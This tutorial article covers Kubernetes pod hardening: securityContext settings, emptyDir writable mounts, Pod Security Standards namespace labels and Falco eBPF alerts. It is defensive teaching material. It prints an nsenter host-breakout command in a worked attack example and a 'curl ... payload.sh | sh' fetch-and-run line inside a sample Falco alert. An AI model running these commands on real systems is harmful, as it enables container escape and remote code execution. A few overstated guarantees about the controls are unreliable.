---
title: "Pod Security and Runtime Hardening"
description: "Isolate containers on the host node kernel using Pod Security Standards, securityContext settings, and eBPF-based Falco runtime alerts."
overview: "Prevent container breakouts by locking down process privileges and filesystems, and detect active host exploits dynamically using real-time kernel syscall tracing."
tags: ["pods", "securityContext", "runtime", "falco", "ebpf", "breakout"]
order: 2
id: article-devsecops-kubernetes-security-pod-security-and-runtime-hardening
aliases:
  - pod-security
  - runtime-security
  - article-devsecops-kubernetes-security-pod-security
  - article-devsecops-kubernetes-security-runtime-security
  - devsecops/kubernetes-security/pod-security.md
  - devsecops/kubernetes-security/runtime-security.md
  - devsecops/kubernetes-security/02-pod-security-and-runtime-hardening.md
  - devsecops/kubernetes-security/02-pod-security-and-runtime-hardening
  - kubernetes-security/02-pod-security-and-runtime-hardening
---

## Table of Contents

1. [Workload Sandbox Boundaries on the Node Kernel](#workload-sandbox-boundaries-on-the-node-kernel)
2. [Anatomy of a Host Namespace Container Breakout](#anatomy-of-a-host-namespace-container-breakout)
3. [Isolating the Sandbox: Pod and Container securityContexts](#isolating-the-sandbox-pod-and-container-securitycontexts)
4. [Designing Writable Directories for Read-Only Filesystems](#designing-writable-directories-for-read-only-filesystems)
5. [Enforcing Baselines: Namespace Pod Security Standards](#enforcing-baselines-namespace-pod-security-standards)
6. [Tackling Pod Security Denials](#tackling-pod-security-denials)
7. [eBPF and Syscall Monitoring: Dynamic Threat Detection](#ebpf-and-syscall-monitoring-dynamic-threat-detection)
8. [Auditing eBPF Syscall Streams with Falco](#auditing-ebpf-syscall-streams-with-falco)
9. [Putting It All Together](#putting-it-all-together)
10. [What's Next](#whats-next)

## Workload Sandbox Boundaries on the Node Kernel

In a Kubernetes cluster, containers do not run inside isolated hardware virtual machines. Instead, a container is simply an ordinary Linux process running directly on the physical host node, sharing the underlying kernel with the host and all neighboring workloads.

To prevent containers from interfering with one another or compromising the host node, the Linux kernel structures a lightweight sandbox boundary using two primary technologies:

First, **Namespaces** construct the illusion of a private operating system instance. Linux namespaces partition kernel resources so that a container process can only see its own virtual environment. This isolation covers process trees (PID namespace), network interfaces (Net namespace), mounted filesystems (Mount namespace), hostnames (UTS namespace), IPC channels (IPC namespace), and user allocations (User namespace).

Second, **Control Groups (cgroups)** enforce resource boundaries. They limit the physical amount of CPU cycles, system memory, network bandwidth, and disk I/O a group of processes can consume, preventing a single misconfigured application from starving the node's physical resources.

Because these boundaries are purely software-based kernel abstractions, a process running inside a container is never truly separated from the host. If a container is configured with administrative Linux capabilities, or if it is allowed to share the host's underlying namespaces, an attacker can easily bypass these software boundaries, escape the container container sandbox, and acquire full root access to the physical host node.

## Anatomy of a Host Namespace Container Breakout

To understand why pod-level process hardening is a critical requirement, we must trace how an attacker exploits an unhardened container specification to execute a host namespace container breakout. Consider a common microservice deployment that runs into a silent vulnerability.

A developer deploys a background cache worker tasked with compiling application telemetry. Because the worker needs to read system performance logs, the developer configures the pod specification with `hostPID: true` and runs the container as the default `root` user (UID 0) without any capability drops.

An attacker discovers an unauthenticated remote execution vulnerability inside the worker's queue-processing loop. They send a malicious payload that spawns a reverse shell session inside the container, running with full root authority.

Because `hostPID: true` was enabled, the attacker's shell can inspect the active process tree of the entire physical host node, not just the container. The attacker executes a standard Linux process listing, finding the parent process ID of the host node's system manager or container runtime.

The attacker uses the container's root capabilities to access the host's physical devices under the virtual Mount namespace. By executing a process namespace attachment command, they dynamically attach their active shell to the PID 1 process tree of the physical host:

```bash
$ nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
```

Because the container was running as the root user with unisolated namespaces, the kernel permits the attachment. Instantly, the attacker's shell escapes the container sandbox. They are now running directly on the host node's physical operating system as the host root administrator, allowing them to capture neighboring pod logs, intercept node credentials, and pivot laterally across the physical cloud account.

The core lesson of this compromise is that the primary failure was not the initial vulnerability inside the cache worker, but the unhardened pod specification. Had the container been constrained to private namespaces, run as a non-root user, and stripped of Linux capabilities, the attacker's shell would have been trapped inside a secure sandbox, preventing the host escape entirely.

## Isolating the Sandbox: Pod and Container securityContexts

Hardening container workloads requires explicit declarations inside the Pod manifest. In Kubernetes, we achieve this by defining a `securityContext` at both the Pod level and the individual container level.

A Pod-level `securityContext` defines baseline execution rules that apply to every container inside the pod. A Container-level `securityContext` defines specific runtime settings that overwrite or supplement the Pod-level values.

To isolate application containers, we must transition from loose defaults to strict, secure settings:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: orders-api
  namespace: orders-prod
spec:
  replicas: 2
  selector:
    matchLabels:
      app: orders-api
  template:
    metadata:
      labels:
        app: orders-api
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: orders-api-container
          image: ghcr.io/devpolaris/orders-api:v1.2.0
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
```

This configuration isolates the process sandbox using five critical parameters:

* **Non-Root User Scoping**: `runAsNonRoot: true` instructs the container runtime to verify that the container image does not run as the root user. `runAsUser: 10001` and `runAsGroup: 10001` explicitly bind the process execution to a low-privilege user ID, neutralizing the risk of a root exploit.
* **Storage Group Scoping**: `fsGroup: 10001` assigns a secure group ownership ID to any mounted storage volumes, ensuring the non-root process possesses the correct, scoped-down permissions to read files on mounted volumes.
* **Syscall Filtering**: `seccompProfile.type: RuntimeDefault` asks the Linux kernel to restrict the available system calls for the container process. This default profile filters out dangerous system calls (such as direct kernel modifications or hardware manipulations) that ordinary applications never need to call.
* **Privilege Escalation Prevention**: `allowPrivilegeEscalation: false` blocks the process from spawning child processes with more privileges than the parent. This prevents binaries with the setuid bit from escalating process authority inside the container.
* **Capability Dropping**: `capabilities.drop: ["ALL"]` strips the container process of all default administrative Linux capabilities (such as raw socket bindings, file ownership changes, or system clock alterations), confining the workload strictly to basic user operations.

By enforcing these constraints, you guarantee that even if an attacker gains control of the application process, they cannot escape the container, modify system configurations, or impact the physical host node.

## Designing Writable Directories for Read-Only Filesystems

Setting `readOnlyRootFilesystem: true` is one of the most powerful controls for preventing container compromise. It guarantees that an attacker who compromises the application process cannot write malicious shell scripts, install utilities, or modify system files. The container image remains a completely immutable, read-only template.

However, many applications need to write temporary files at runtime, such as logs, telemetry, caches, or upload chunks. If the root filesystem is completely read-only and no writable paths are configured, the container process will fail immediately at startup with write denial errors.

To solve this, we must design explicit, isolated writable directories. We achieve this by mounting temporary, ephemeral **emptyDir** volumes:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: orders-api-ephemeral
  namespace: orders-prod
spec:
  template:
    spec:
      containers:
        - name: orders-api-container
          image: ghcr.io/devpolaris/orders-api:v1.2.0
          securityContext:
            readOnlyRootFilesystem: true
          volumeMounts:
            - name: ephemeral-tmp
              mountPath: /tmp
      volumes:
        - name: ephemeral-tmp
          emptyDir: {}
```

This design mounts a virtual, temporary filesystem directory at `/tmp`. The container's core filesystem (`/app`, `/usr`, `/etc`) remains completely read-only, but the process can write temporary files to `/tmp`.

`emptyDir` volumes are created when the pod starts and are completely deleted when the pod is removed from the node. Because the volume lives in RAM or node storage, it provides an isolated, high-performance scratch pad without exposing the host filesystem or allowing persistent modifications.

## Enforcing Baselines: Namespace Pod Security Standards

Configuring `securityContext` settings inside every Deployment manifest is critical. However, in large organizations, security teams cannot manually review every developer's YAML file to verify these parameters. We must enforce security baselines automatically at the cluster API boundary.

Kubernetes structures this enforcement through built-in **Pod Security Standards**. The standard defines three distinct security profiles:

* **Privileged**: An unhardened profile designed exclusively for system workloads. It permits host namespaces, privileged containers, and full capability configurations.
* **Baseline**: A moderate profile that blocks known host privilege escalations but permits containers to run as root by default, which is unsuitable for high-security environments.
* **Restricted**: The strictest profile designed for standard application workloads. It requires workloads to run as non-root, drop all capabilities, enforce read-only filesystems, and use the default seccomp profile.

We enforce these profiles by applying metadata labels directly to our namespaces. The policy engine evaluates incoming pod definitions dynamically against the selected standard:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: orders-prod
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: latest
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/audit-version: latest
```

These namespace labels operate in three modes:

* **enforce**: The API Server actively blocks any pod request that violates the restricted profile, preventing non-compliant workloads from ever being scheduled.
* **warn**: The API Server returns a descriptive warning to the client (like a developer executing `kubectl apply`), notifying them of policy violations without blocking deployment.
* **audit**: The API Server writes a formal audit annotation to the cluster logs, providing security teams with permanent compliance evidence.

By labeling the namespace, you establish a non-bypassable guardrail that guarantees all running workloads adhere strictly to corporate security standards.

## Tackling Pod Security Denials

When a namespace is labeled with `enforce: restricted`, any attempt to apply a manifest that violates the profile is blocked at the API boundary, returning a highly detailed error message. Reviewing these denials is a critical skill for troubleshooting.

Consider a developer attempting to run a legacy test pod with unhardened settings:

```bash
$ kubectl apply -f unhardened-test-pod.yaml
Error from server (Forbidden): error when creating "unhardened-test-pod.yaml":
pods "orders-test" is forbidden: violates PodSecurity "restricted:latest":
privileged (container "api" must not set securityContext.privileged=true),
allowPrivilegeEscalation != false (container "api" must set securityContext.allowPrivilegeEscalation=false),
unrestricted capabilities (container "api" must set securityContext.capabilities.drop=["ALL"]),
seccompProfile (pod or container "api" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
```

This denial message points directly to the offending configurations. To resolve the violation, the developer must:

First, modify `securityContext.privileged` to `false` or remove the parameter completely.

Second, explicitly set `securityContext.allowPrivilegeEscalation` to `false`.

Third, add the capabilities drop block to strip all Linux privileges.

Fourth, configure the `seccompProfile` type to `RuntimeDefault` in the Pod spec.

By fixing these specific fields and re-applying the manifest, the pod complies with the restricted standard and is accepted by the API Server, ensuring the workload is safely hardened before execution.

## eBPF and Syscall Monitoring: Dynamic Threat Detection

Static controls (such as `securityContext` settings and admission policies) are critical for reducing the cluster's attack surface. However, a highly sophisticated attacker might exploit a zero-day vulnerability in the Linux kernel itself, bypassing the configured sandbox boundaries at runtime. 

To detect these zero-day threats, organizations must implement dynamic **Runtime Security**. This detection layer watches what container processes are actually doing after they start.

Modern runtime security relies on **extended Berkeley Packet Filter (eBPF)** technology. eBPF is a highly efficient kernel technology that executes sandboxed programs directly inside the Linux kernel without modifying the kernel source code or loading heavyweight kernel modules.

eBPF programs act as low-overhead sensors that audit kernel **System Calls (syscalls)**. A syscall is a request a process sends to the kernel to perform privileged operations, such as opening a file (`open`), executing a binary (`execve`), binding to a network port (`bind`), or establishing a socket connection (`connect`).

Because every container process must invoke system calls to interact with the OS, eBPF sensors capture every single system operation in real-time, providing immediate visibility into anomalous container activity.

## Auditing eBPF Syscall Streams with Falco

One of the most powerful, CNCF-graduated tools for auditing syscall streams in real-time is **Falco**. Falco monitors eBPF syscall events, matching process activity against a database of customizable security rules.

When a container process violates a rule, Falco generates a detailed alert. Because Falco integrates with the Kubernetes API, the alert automatically enriches the raw Linux kernel data with Kubernetes metadata, including the namespace, pod name, container image, and ServiceAccount.

Consider a Falco alert triggered by an attacker launching an unauthorized shell process inside a production container:

```json
{
  "output": "13:04:22.481 WARN Unexpected shell in container (user=orders-api-sa pod=orders-api-7c9f68dbd9-2m7qk ns=orders-prod container=api image=ghcr.io/devpolaris/orders-api@sha256:4e1b9f30 exe=/bin/sh parent=node cmdline=/bin/sh -c curl http://198.51.100.24/payload.sh | sh)",
  "priority": "Warning",
  "rule": "Terminal shell in container",
  "source": "syscall",
  "tags": ["container", "shell", "mitre_execution"]
}
```

This alert provides complete security evidence:
* **The Target**: `ns=orders-prod` and `pod=orders-api-7c9f68dbd9-2m7qk` identify the exact namespace and running container that was compromised.
* **The Actor**: `user=orders-api-sa` identifies the ServiceAccount identity, allowing security teams to audit its associated RBAC policies.
* **The Operation**: `exe=/bin/sh` and `parent=node` confirm that an interactive shell was spawned by the Node process, indicating a severe application exploitation event.
* **The Action**: `cmdline` logs the exact malicious payload executed, proving the attacker attempted to download an external shell script (`payload.sh`).

By deploying Falco and forwarding its alerts to centralized, read-only logging platforms, security operations teams can immediately detect container compromise, trace attacker actions step-by-step, and execute automated response playbooks to isolate and delete compromised pods.

## Putting It All Together

Securing container workloads requires combining preventative, static sandbox controls with dynamic, detective runtime sensors. By stripping Linux capabilities, enforcing read-only root filesystems, applying Pod Security Standards, and monitoring syscall events using eBPF, we isolate our containers and protect host nodes from breakout exploits.

When hardening and auditing your workload security, ensure you maintain these five core practices:

First, configure strict `securityContext` parameters in every container manifest. Force processes to run as non-root, drop all Linux capabilities, and block privilege escalation.

Second, enforce a read-only root filesystem for all application containers. Eliminate writable layers in the running image, configuring isolated `emptyDir` mounts exclusively for temporary runtime folders.

Third, label all namespaces with the `restricted` Pod Security Standard. Establish automated API gates to block non-compliant YAML files before they are scheduled.

Fourth, deploy eBPF-based syscall monitoring agents across all host nodes. Track running process behavior in real-time, auditing system calls without imposing performance overhead.

Fifth, configure real-time alerts for anomalous runtime signals. Set up detection rules to immediately flag interactive shell executions, root directory writes, and unauthorized external network connections, integrating logs with Kubernetes metadata for forensic trace audits.

## What's Next

Configuring secure sandbox boundaries and eBPF runtime sensors protects our nodes from container breakouts. However, we must also restrict network communication between running containers to prevent lateral movement. In the next chapter, **Network Isolation**, we will cover configuring namespace-wide default-deny NetworkPolicies, writing label-based ingress/egress filtering rules, and verifying traffic paths using diagnostic test pods.

![Pod security and runtime hardening summary map](/content-assets/articles/article-devsecops-kubernetes-security-pod-security-and-runtime-hardening/pod-hardening-summary.png)

*This summary connects security contexts, non-root workloads, read-only filesystems, baseline policy, runtime monitoring, and alerts.*

---

**References**

- [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/) - Official specification of privileged, baseline, and restricted workload profiles.
- [Kubernetes Pod Security Admission](https://kubernetes.io/docs/concepts/security/pod-security-admission/) - Guidelines on labeling namespaces to enforce security baselines automatically.
- [Falco Runtime Security Documentation](https://falco.org/docs/) - CNCF-graduated guide on monitoring kernel system calls and writing custom detection rules.
- [NIST SP 800-190 Application Container Security Guide](https://csrc.nist.gov/pubs/sp/800/190/final) - Recommendations on isolating container namespaces, dropping capabilities, and securing physical host nodes.
- [Linux Namespaces and Cgroups Reference](https://man7.org/linux/man-pages/man7/namespaces.7.html) - Technical specifications detailing Linux kernel isolation technologies.
